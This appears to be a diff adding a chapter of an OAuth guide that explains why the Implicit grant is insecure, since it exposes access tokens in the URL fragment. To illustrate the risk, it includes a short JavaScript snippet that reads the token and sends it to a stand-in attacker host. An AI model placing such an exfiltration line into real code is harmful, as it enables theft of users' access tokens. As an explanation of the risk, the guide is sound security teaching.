@@ -1,0 +1,53 @@
+# Implicit grant in OAuth 2.0
+
+The next grant that is defined in the OAuth 2.0 specification is the Implicit grant. If this were a normal guide, we would cover this grant in detail the same way we covered the Authorization Code grant. Except, I'm not going to. :)
+
+> Please don't use the Implicit grant.
+
+The reason we won't cover the Implicit grant in detail is that it is horribly insecure, broken, deprecated, and should never, ever be used (ever). Okay, maybe that's being a bit dramatic, but please don't use this grant. Instead of showing you how to use it, let's discuss why you should not.
+
+The Implicit grant has been removed from OAuth as of the most recent version of the OAuth 2.1 draft specification. The reason that it has been removed is that it skips an important step that allows you to secure the tokens you receive from the OAuth server. This step occurs when your application backend makes the call to the Token endpoint to retrieve the tokens.
+
+Unlike the Authorization Code grant, the Implicit grant does not redirect the browser to your application server with an authorization code. Instead, it puts the access token directly on the URL as part of the redirect. These URLs look like this:
+
+`https://my-app.com/#token-goes-here`
+
+The token is added to the redirect URL after the `#` symbol, which means it is technically the fragment portion of the URL. What this really means is that wherever the OAuth server redirects the browser to, the access token is accessible to basically everyone. 
+
+Specifically, the access token is accessible to any and all JavaScript running in the browser. Since this token allows the browser to make API calls and web requests on behalf of the user, having this token be accessible to third-party code is extremely dangerous.
+
+Let's take a dummy example of a single-page web application that uses the Implicit grant:
+
+```html
+// This is dummy code for a SPA that uses the access token
+<html>
+<head>
+  <script type="text/javascript" src="/my-spa-code-1.0.0.js"></script>
+  <script type="text/javascript" src="https://some-third-party-server.com/a-library-found-online-that-looked-cool-0.42.0.js"></script>
+</head>
+<body>
+...
+</body>
+```
+
+This HTML page includes 2 JavaScript libraries:
+
+* The code for the application itself: `my-spa-code-1.0.0.js`
+* A library we found online that did something cool we needed and we pulled in: `a-library-found-online-that-looked-cool-0.42.0.js`
+
+Let's assume that our code is 100% secure and we don't have to worry about it. The issue here is that the library we pulled in is an unknown quantity. It might include other libraries as well. Remember that the DOM is dynamic. Any JavaScript can load any other JavaScript library simply by updating the DOM with more `<script>` tags. Therefore, we have very little chance of ensuring that every other line of code from third-party libraries is secure.
+
+If a third-party library wanted to steal an access token from our dummy application, all it would need to do is run this code:
+
+```javascript
+if (window.location.hash.contains('access_token')) {
+  fetch('http://steal-those-tokens.com/yummy?hash=' + window.location.hash);
+}
+```
+
+Three lines of code and the access token has been stolen. The application at `http://steal-those-tokens.com/yummy` can save these off, call the `login.twgtl.com` to verify the tokens are useful, and then can call APIs and other resources presenting the `access_token`. Oops.
+
+As you can see, the risk of leaking tokens is far too high to ever consider using the Implicit grant. This is why we recommend that no one ever use this grant.
+
+If you aren't dissuaded by the above example and you really need to use the Implicit grant, please [check out our documentation](https://fusionauth.io/docs/v1/tech/oauth/#example-implicit-grant), which walks you through how to implement it. 
+
